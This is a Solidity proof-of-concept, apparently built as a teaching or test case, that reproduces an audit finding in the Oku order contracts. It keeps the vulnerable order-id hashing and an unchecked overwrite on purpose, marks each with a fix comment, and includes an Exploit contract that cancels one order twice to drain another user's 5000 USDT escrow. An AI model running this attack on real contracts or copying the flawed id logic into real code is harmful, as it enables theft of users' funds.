// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Oku — stop-limit id collision with bracket orders (Sherlock 2024-11, #44377, H-7).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: AutomationMaster.generateOrderId hashes only (sender, block.timestamp).
    Bracket.createOrder and StopLimit.createOrder therefore mint the same id for one
    user in one block. Filling the stop calls Bracket.fillStopLimitOrder with that id,
    which overwrites the live bracket order and pushes the id a second time.
    cancelOrder refunds the overwritten amountIn once per pending copy.
    Audited body of generateOrderId is preserved verbatim (@> VULN).

    Repo: sherlock-audit/2024-11-oku @ ee3f781a73d65e33fb452c9a44eb1337c5cfdbd6
    AutomationMaster.sol generateOrderId, Bracket._createOrder / _cancelOrder,
    StopLimit._createOrder / performUpkeep → Bracket.fillStopLimitOrder. */

interface IOrderIdMaster {
    function generateOrderId(address sender) external returns (uint96);
}

/// USDT stand-in. 6 decimals, same units as the finding (5000e6 / 10000e6).
contract MockUSDT {
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Audited AutomationMaster.generateOrderId (view override on IOrderIdMaster).
/// Body matches sherlock-audit/2024-11-oku @ ee3f781a AutomationMaster.sol.
contract AutomationMaster is IOrderIdMaster {
    ///@notice generate a random and unique order id
    function generateOrderId(address sender) external view override returns (uint96) {
        uint256 hashedValue = uint256(
            // @> VULN: id is keccak(sender, block.timestamp) only — no calling contract, no nonce — so Bracket and StopLimit collide
            keccak256(abi.encodePacked(sender, block.timestamp))
        );
        return uint96(hashedValue);
        // FIX: keccak(sender, block.timestamp, msg.sender, ++nonce) so each contract and each order is distinct
    }
}

contract Bracket {
    struct Order {
        uint96 orderId;
        uint256 amountIn;
        address recipient;
    }

    IOrderIdMaster public MASTER;
    MockUSDT public usdt;
    address public stopLimit;
    uint96[] public pendingOrderIds;
    mapping(uint96 => Order) public orders;

    constructor(address _master, address _usdt) {
        MASTER = IOrderIdMaster(_master);
        usdt = MockUSDT(_usdt);
    }

    function registerStopLimit(address s) external {
        require(stopLimit == address(0), "set");
        stopLimit = s;
    }

    function createOrder(uint256 amountIn, address recipient) external returns (uint96) {
        usdt.transferFrom(msg.sender, address(this), amountIn);
        return _createOrder(amountIn, 0, recipient);
    }

    /// Real Bracket.fillStopLimitOrder. StopLimit is the only caller. existingOrderId
    /// is the stop's id, reused on purpose — and unchecked against orders[].
    function fillStopLimitOrder(uint256 amountIn, uint96 existingOrderId, address recipient) external returns (uint96) {
        require(msg.sender == stopLimit, "Only Stop Limit");
        usdt.transferFrom(msg.sender, address(this), amountIn);
        return _createOrder(amountIn, existingOrderId, recipient);
    }

    function _createOrder(uint256 amountIn, uint96 existingOrderId, address recipient) internal returns (uint96) {
        //generate random but unique order id if there is not an existing orderId from a stop limit order
        if (existingOrderId == 0) {
            existingOrderId = MASTER.generateOrderId(msg.sender);
        }

        // @> VULN: no check that orders[existingOrderId] is empty, so a stop-limit fill overwrites a live bracket order
        orders[existingOrderId] = Order({orderId: existingOrderId, amountIn: amountIn, recipient: recipient});
        // FIX: require(orders[existingOrderId].orderId == 0, "Order ID Collision");

        //store pending order
        pendingOrderIds.push(existingOrderId);
        return existingOrderId;
    }

    function cancelOrder(uint96 orderId) external {
        Order memory order = orders[orderId];
        require(msg.sender == order.recipient, "Only Order Owner");
        require(_cancelOrder(order), "Order not active");
    }

    /// Audited Bracket._cancelOrder: one pending copy is removed and order.amountIn is
    /// refunded. The mapping entry is left in place, so a second copy pays amountIn again.
    function _cancelOrder(Order memory order) internal returns (bool) {
        for (uint96 i = 0; i < pendingOrderIds.length; i++) {
            if (pendingOrderIds[i] == order.orderId) {
                pendingOrderIds = _removeAt(i);
                usdt.transfer(order.recipient, order.amountIn);
                return true;
            }
        }
        return false;
    }

    function _removeAt(uint96 idx) internal view returns (uint96[] memory newList) {
        uint256 n = pendingOrderIds.length;
        newList = new uint96[](n - 1);
        for (uint256 i = 0; i < idx; i++) newList[i] = pendingOrderIds[i];
        for (uint256 i = uint256(idx) + 1; i < n; i++) newList[i - 1] = pendingOrderIds[i];
    }

    function pendingCount() external view returns (uint256) {
        return pendingOrderIds.length;
    }

    function copiesOf(uint96 orderId) external view returns (uint256 n) {
        for (uint256 i = 0; i < pendingOrderIds.length; i++) {
            if (pendingOrderIds[i] == orderId) n += 1;
        }
    }

    function amountInOf(uint96 orderId) external view returns (uint256) {
        return orders[orderId].amountIn;
    }
}

contract StopLimit {
    struct Order {
        uint96 orderId;
        uint256 amountIn;
        address recipient;
    }

    IOrderIdMaster public MASTER;
    Bracket public BRACKET_CONTRACT;
    MockUSDT public usdt;
    uint96[] public pendingOrderIds;
    mapping(uint96 => Order) public orders;

    constructor(address _master, address _bracket, address _usdt) {
        MASTER = IOrderIdMaster(_master);
        BRACKET_CONTRACT = Bracket(_bracket);
        usdt = MockUSDT(_usdt);
    }

    function createOrder(uint256 amountIn, address recipient) external returns (uint96 orderId) {
        usdt.transferFrom(msg.sender, address(this), amountIn);
        orderId = MASTER.generateOrderId(msg.sender);
        orders[orderId] = Order({orderId: orderId, amountIn: amountIn, recipient: recipient});
        pendingOrderIds.push(orderId);
    }

    /// Real performUpkeep hands the stop's existing orderId to Bracket. The price
    /// check is omitted: this reduction fills the single pending stop immediately,
    /// which is the same handoff the finding's same-block path relies on.
    function performUpkeep() external {
        uint96 orderId = pendingOrderIds[0];
        Order memory order = orders[orderId];
        pendingOrderIds.pop();
        usdt.approve(address(BRACKET_CONTRACT), order.amountIn);
        BRACKET_CONTRACT.fillStopLimitOrder(order.amountIn, order.orderId, order.recipient);
    }
}

contract Victim {
    function openBracket(Bracket bracket, MockUSDT token, uint256 amount) external returns (uint96 id) {
        token.approve(address(bracket), amount);
        id = bracket.createOrder(amount, address(this));
    }
}

contract Exploit {
    uint256 public constant BRACKET_IN = 5000e6;
    uint256 public constant STOP_IN = 10000e6;
    uint256 public constant VICTIM_IN = 5000e6;
    uint256 public constant STOLEN = 5000e6;

    MockUSDT public usdt; // nonce 1
    AutomationMaster public master; // nonce 2
    Bracket public bracket; // nonce 3
    StopLimit public stopLimit; // nonce 4
    Victim public victim; // nonce 5

    uint96 public victimOrderId;
    uint96 public bracketOrderId;
    uint96 public stopOrderId;
    uint256 public profit;

    constructor() {
        usdt = new MockUSDT();
        master = new AutomationMaster();
        bracket = new Bracket(address(master), address(usdt));
        stopLimit = new StopLimit(address(master), address(bracket), address(usdt));
        bracket.registerStopLimit(address(stopLimit));
        victim = new Victim();
        // Victim escrow is already inside Bracket before run(). Different sender, so a different id.
        usdt.mint(address(victim), VICTIM_IN);
        victimOrderId = victim.openBracket(bracket, usdt, VICTIM_IN);
        usdt.mint(address(this), BRACKET_IN + STOP_IN);
    }

    function run() external {
        uint256 beforeBal = usdt.balanceOf(address(this));
        usdt.approve(address(bracket), BRACKET_IN);
        bracketOrderId = bracket.createOrder(BRACKET_IN, address(this));
        usdt.approve(address(stopLimit), STOP_IN);
        stopOrderId = stopLimit.createOrder(STOP_IN, address(this));
        require(stopOrderId == bracketOrderId, "ids diverged");
        stopLimit.performUpkeep();
        require(bracket.copiesOf(bracketOrderId) == 2, "id not duplicated");
        require(bracket.amountInOf(bracketOrderId) == STOP_IN, "amount not overwritten");
        bracket.cancelOrder(bracketOrderId);
        bracket.cancelOrder(bracketOrderId);
        uint256 afterBal = usdt.balanceOf(address(this));
        profit = afterBal - beforeBal;
        uint256 liability = bracket.amountInOf(victimOrderId);
        uint256 assets = usdt.balanceOf(address(bracket));
        require(profit == STOLEN, "profit");
        require(liability == VICTIM_IN && assets == 0, "solvent");
        require(usdt.balanceOf(address(victim)) == 0, "victim paid");
    }
}
